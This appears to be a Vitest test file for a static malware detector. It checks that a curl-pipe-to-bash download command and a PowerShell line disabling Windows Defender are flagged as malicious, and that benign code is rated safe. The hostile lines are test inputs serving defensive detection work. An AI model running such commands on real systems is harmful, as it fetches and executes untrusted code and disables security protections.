import { describe, expect, it } from 'vitest';
import { analyzeCode } from './codeAnalysis';

describe('analyzeCode', () => {
  it('flags high-risk execution and download chains without executing source', () => {
    const result = analyzeCode('curl https://example.com/a.sh | bash\nSet-MpPreference -DisableRealtimeMonitoring');

    expect(result.verdict).toBe('Malicious');
    expect(result.maliciousScore).toBeGreaterThanOrEqual(55);
    expect(result.findings.map((finding) => finding.source)).toEqual(expect.arrayContaining([
      'static.code_pattern.shell-download-pipe',
      'static.code_pattern.disable-defender',
    ]));
  });

  it('keeps ordinary source safe and evidence-free', () => {
    const result = analyzeCode('const answer = 40 + 2;\nconsole.log(answer);');

    expect(result.verdict).toBe('Safe');
    expect(result.maliciousScore).toBe(0);
    expect(result.findings).toHaveLength(0);
  });
});